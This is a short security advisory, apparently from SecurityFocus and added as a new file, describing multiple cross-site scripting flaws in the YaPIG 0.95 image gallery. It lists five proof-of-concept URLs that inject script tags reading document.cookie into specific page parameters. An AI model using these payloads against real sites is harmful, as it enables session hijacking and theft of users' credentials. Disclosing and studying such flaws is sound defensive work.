@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/47698/info
+
+YaPIG is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+YaPIG 0.95 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/template/default/add_comment_form.php?I_ADD_COMMENT=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/template/default/admin_task_bar.php?I_ADMIN_TASKS=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/template/default/delete_gallery_form.php?I_SELECT_OPT=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/template/default/face_begin.php?I_TITLE=%3C/title%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/slideshow.php?interval=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
